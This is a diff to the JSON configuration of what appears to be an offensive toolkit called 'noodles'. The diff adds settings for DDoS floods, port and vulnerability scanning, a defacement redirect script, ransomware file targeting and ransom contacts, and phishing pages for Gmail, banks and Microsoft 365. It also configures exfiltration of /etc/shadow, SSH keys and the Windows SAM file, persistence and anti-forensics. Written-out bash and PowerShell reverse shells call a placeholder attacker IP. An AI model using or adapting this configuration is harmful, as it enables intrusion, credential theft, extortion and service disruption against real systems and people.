@@ -24,24 +24,30 @@
       "concurrent_connections_limit": 5000,
       "source_ip_spoofing_enabled": false,
       "proxy_support_enabled": false,
-      "rate_limit_per_target_ip": 0
+      "rate_limit_per_target_ip": 0,
+      "randomize_target_ports": false
     },
     "http_flood": {
       "requests_per_second": 1000,
       "duration_seconds": 600,
       "http_methods": ["GET", "POST"],
-      "target_path": "/",
+      "common_paths": ["/", "/index.html", "/login", "/api/data", "/search"],
+      "randomize_user_agent": true,
+      "randomize_query_params": true,
       "user_agents": [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/100.0.4896.77 Mobile/15E148 Safari/604.1"
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/100.0.4896.77 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Android 12; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0"
       ],
       "headers": {
         "Cache-Control": "no-cache",
         "Connection": "keep-alive",
         "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "en-US,en;q=0.9"
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://google.com/",
+        "X-Requested-With": "XMLHttpRequest"
       },
       "post_data_template": "param1=value1&param2=value2"
     },
@@ -49,7 +55,8 @@
       "packets_per_second": 5000,
       "duration_seconds": 600,
       "port": 80,
-      "flags": ["SYN", "ACK"],
+      "flags": ["SYN"],
+      "flag_options": ["SYN", "ACK", "FIN", "RST", "PSH", "URG", "ALL"],
       "payload_size": 0,
       "initial_window_size": 65535
     },
@@ -57,6 +64,7 @@
       "packets_per_second": 5000,
       "duration_seconds": 600,
       "port": 53,
+      "service_types": ["DNS", "NTP", "SSDP", "CHARGEN", "QUIC"],
       "payload_size": 1472,
       "source_port_range": [1024, 65535]
     },
@@ -97,6 +105,11 @@
     "remove_elements": {
       "description": "Removes elements matching a specified CSS selector.",
       "default_selector": "header, footer, nav"
+    },
+    "redirect_to_url": {
+      "description": "Redirects the browser to a specified URL.",
+      "default_url": "https://noodles.tech/defaced",
+      "html_snippet": "<script>window.location.replace('__REDIRECT_URL__');</script>"
     }
   },
   "connection_defaults": {
@@ -105,27 +118,34 @@
       "common_ports": [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306, 3389, 5900, 8080, 8443],
       "timeout_ms": 1000,
       "scan_type": "SYN",
-      "full_range_scan_enabled": false
+      "scan_methods": ["SYN", "CONNECT", "UDP", "XMAS", "FIN"],
+      "full_range_scan_enabled": false,
+      "max_concurrency": 100
     },
     "banner_grab": {
       "description": "Configuration for grabbing service banners.",
       "default_port": 80,
       "timeout_ms": 2000,
-      "service_version_detection_enabled": true
+      "service_version_detection_enabled": true,
+      "protocols_to_check": ["HTTP", "HTTPS", "FTP", "SSH", "SMTP", "POP3", "IMAP"]
     },
     "os_detection": {
       "description": "Configuration for attempting to detect the target operating system.",
       "enabled": true,
-      "intensity_level": "normal"
+      "intensity_level": "normal",
+      "intensity_levels": ["light", "normal", "aggressive"]
     },
     "vulnerability_scan": {
       "description": "Configuration for basic vulnerability scanning profiles.",
       "enabled": false,
       "profiles": {
-        "basic": ["CVE-2017-0144", "Heartbleed"],
-        "web_app": ["SQL Injection", "XSS", "CSRF"]
+        "basic": ["CVE-2017-0144", "Heartbleed", "Shellshock"],
+        "web_app": ["SQL Injection", "XSS", "CSRF", "RCE"],
+        "network": ["SMBGhost", "EternalBlue"]
       },
-      "default_profile": "basic"
+      "default_profile": "basic",
+      "scan_depth_levels": ["shallow", "normal", "deep"],
+      "plugin_categories": ["web", "network", "system", "database", "compliance"]
     }
   },
   "ransomware_conceptual": {
@@ -135,6 +155,8 @@
     "simulated_btc_address": "bc1qabcdefghijklmnopqrstuvwxyz0123456789abc",
     "simulated_timer_hours": 72,
     "encrypted_file_extension": ".noodles",
+    "target_file_extensions": [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".png", ".zip", ".rar", ".7z", ".sql", ".db", ".txt", ".csv", ".bak"],
+    "simulated_decryption_tool_name": "Noodles Decryptor v1.0",
     "contact_details": {
       "email": "decrypt@noodles.onion",
       "chat_url": "http://noodleschat.onion/__UNIQUE_ID__"
@@ -144,17 +166,24 @@
   "other_tools_defaults": {
     "payload_generator": {
       "description": "Settings for generating various types of malicious payloads.",
-      "types": ["reverse_shell", "bind_shell", "keylogger", "trojan", "worm", "rootkit"],
+      "types": ["reverse_shell", "bind_shell", "keylogger", "trojan", "worm", "rootkit", "beacon"],
       "default_os": "linux",
       "default_arch": "x64",
-      "reverse_shell_template": "bash -i >& /dev/tcp/__ATTACKER_IP__/__ATTACKER_PORT__ 0>&1",
-      "bind_shell_template": "nc -lvp __LISTENER_PORT__ -e /bin/bash",
+      "reverse_shell_template_linux": "bash -i >& /dev/tcp/__ATTACKER_IP__/__ATTACKER_PORT__ 0>&1",
+      "reverse_shell_template_windows_powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('__ATTACKER_IP__',__ATTACKER_PORT__);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$bytes2 = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($bytes2,0,$bytes2.Length)};$client.Close()\"",
+      "bind_shell_template_linux": "nc -lvp __LISTENER_PORT__ -e /bin/bash",
       "obfuscation_options": {
         "enabled": false,
-        "methods": ["base64", "xor", "shikata_ga_nai"],
+        "methods": ["base64", "xor", "shikata_ga_nai", "polymorphic_encryption"],
         "default_method": "base64"
       },
-      "output_formats": ["exe", "dll", "sh", "ps1", "py", "elf"]
+      "payload_options": {
+        "encoder": "none",
+        "bad_chars": "",
+        "staged": false,
+        "sleep_seconds": 0
+      },
+      "output_formats": ["exe", "dll", "sh", "ps1", "py", "elf", "jar", "msi"]
     },
     "credential_harvester": {
       "description": "Settings for phishing and credential harvesting operations.",
@@ -164,10 +193,13 @@
         "gmail": {"title": "Gmail Login", "html": "<form><input type='email' placeholder='Email'/><input type='password' placeholder='Password'/><button>Next</button></form>"},
         "bank": {"title": "Bank Login", "html": "<form><input type='text' placeholder='Username'/><input type='password' placeholder='Password'/><button>Sign In</button></form>"},
         "cloud_storage": {"title": "Cloud Storage Login", "html": "<form><input type='email' placeholder='Email'/><input type='password' placeholder='Password'/><button>Access Files</button></form>"},
+        "microsoft_office365": {"title": "Microsoft 365 Login", "html": "<form><input type='email' placeholder='Email, phone, or Skype'/><button>Next</button></form>"},
         "custom_template_fields": ["title", "html", "redirect_url"]
       },
       "data_exfiltration_method": "webhook",
-      "data_exfiltration_endpoint": "https://webhook.site/your-unique-id"
+      "data_exfiltration_endpoint": "https://webhook.site/your-unique-id",
+      "domain_cloning_enabled": false,
+      "dns_spoofing_enabled": false
     },
     "data_exfiltration_defaults": {
       "description": "Default settings for extracting data from target systems.",
@@ -175,22 +207,27 @@
       "default_target_server": "exfil.noodles.tech",
       "encrypted_transfer_enabled": true,
       "compression_enabled": true,
+      "archive_format": "zip",
       "chunk_size_mb": 10,
-      "common_targets": ["/etc/passwd", "/etc/shadow", "/var/www/html/config.php", "~/.ssh/id_rsa"]
+      "common_targets": ["/etc/passwd", "/etc/shadow", "/var/www/html/config.php", "~/.ssh/id_rsa", "/root/.bash_history", "C:\\Windows\\System32\\config\\SAM", "C:\\Users\\Public\\Documents"],
+      "prioritized_data_types": ["credentials", "documents", "databases", "source_code", "certificates", "logs"]
     },
     "privilege_escalation_defaults": {
       "description": "Default techniques and configurations for privilege escalation.",
-      "linux_techniques": ["sudo_misconfiguration", "kernel_exploits", "cron_jobs", "writable_paths"],
-      "windows_techniques": ["service_misconfiguration", "kernel_exploits", "weak_permissions", "unquoted_service_paths"],
+      "linux_techniques": ["sudo_misconfiguration", "kernel_exploits", "cron_jobs", "writable_paths", "SUID_SGID_binaries", "NFS_misconfiguration"],
+      "windows_techniques": ["service_misconfiguration", "kernel_exploits", "weak_permissions", "unquoted_service_paths", "DLL_hijacking", "AlwaysInstallElevated"],
       "default_os_check_enabled": true,
-      "exploit_db_integration_enabled": true
+      "exploit_db_integration_enabled": true,
+      "common_vulnerabilities_linux": ["DirtyPipe", "PwnKit", "CVE-2021-4034"],
+      "common_vulnerabilities_windows": ["PrintNightmare", "ZeroLogon", "PetitPotam"]
     },
     "persistence_defaults": {
       "description": "Default methods for maintaining access to a compromised system.",
-      "linux_methods": ["cron_jobs", "systemd_units", "init_scripts", "ssh_keys"],
-      "windows_methods": ["registry_run_keys", "scheduled_tasks", "services", "WMI"],
+      "linux_methods": ["cron_jobs", "systemd_units", "init_scripts", "ssh_keys", "LD_PRELOAD", "rootkit_installation"],
+      "windows_methods": ["registry_run_keys", "scheduled_tasks", "services", "WMI", "startup_folders", "image_file_execution_options"],
       "default_reconnection_interval_seconds": 300,
-      "anti_forensics_enabled": true
+      "anti_forensics_enabled": true,
+      "stealth_techniques": ["file_timestamp_modification", "process_hiding", "rootkit_integration", "event_log_clearing"]
     }
   }
 }
